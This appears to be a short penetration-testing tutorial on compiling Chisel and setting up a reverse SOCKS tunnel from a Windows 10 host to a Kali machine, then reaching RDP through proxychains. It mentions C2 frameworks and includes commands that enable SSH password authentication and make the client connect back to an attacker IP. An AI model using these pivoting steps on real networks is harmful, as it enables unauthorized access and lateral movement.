### Chisel - Reverse RDP Proxying

In some cases we may need to rely on a standalone application when using products like PowerShell Empire or Covenant.

Chisel is an open-source tunneling software written in Golang. It works by setting up a TCP tunnel an performing data transfers over HTTP, while securing it with SSH.

Chisel contains both client and sever components and creates a SOCKS-compliant proxy.


1. Compiling Linux version of chisel

```bash
sudo apt install golang

sudo git clone https://github.com/jpillora/chisel.git

cd chisel/

go build
```

2. Compiling Windows version of chisel.

```bash
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

3. Set up the reverse tunnel with chisel

```bash
./chisel server -p 8080 --socks5
```bash

4. Configure SOCKS proxy server with the Kali SSH Server

```bash
sudo sed -i 's/#PasswordAuthentication yes /PasswordAuthentication yes/g' /etc/ssh/sshd_config

sudo systemctl start ssh.service

ssh -N -D 0.0.0.0:1080 localhost
```

5. Set up the Chisel client on Windows 10

IP/PORT = Server instance of chisel 

```bash
chisel.exe client 192.168.x.x:8080 socks
```

6. Once the tunnel created, open RDP session to the Windows 10 client wiht proxychains

```bash
sudo proxychains rdesktop 192.168.x.x
```